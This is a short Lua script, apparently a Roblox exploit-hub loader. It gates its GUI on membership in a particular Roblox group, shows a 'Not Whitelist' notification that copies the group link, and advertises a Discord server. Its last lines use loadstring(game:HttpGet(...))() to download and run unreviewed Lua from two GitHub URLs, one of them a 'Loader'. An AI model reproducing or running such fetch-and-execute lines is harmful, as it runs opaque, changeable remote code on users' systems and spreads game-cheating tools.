local bindable = Instance.new("BindableFunction")
function bindable.OnInvoke(response)
	print("else")
	setclipboard("https://web.roblox.com/groups/14396486/Pog-Hub-No-Carte-Fan-Club#!/about")
end
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Not Whitelist",
	Icon = "rbxassetid://7495464623"; 
	Text = "Roblox Group Whitelist Only",
	Duration = 65464,
	Callback = bindable,
	Button1 = "Copy Roblox Group"
})

local groupID = 14396486


local plr = game.Players.LocalPlayer

script.Parent.Enabled = false

repeat wait() until plr.Character

local gui = script.Parent


if plr:IsInGroup(groupID) then

	script.Parent.Enabled = true

else

	script.Parent:Destroy()

end

--- Discord invite
loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/AutoinviteDiscord03s/main/README.md"))()

--- Loader/GamePlace.id
loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/discord.gg-x4gGhjVxXz/main/Loader.lua"))()

--- discord.gg/x4gGhjVxXz
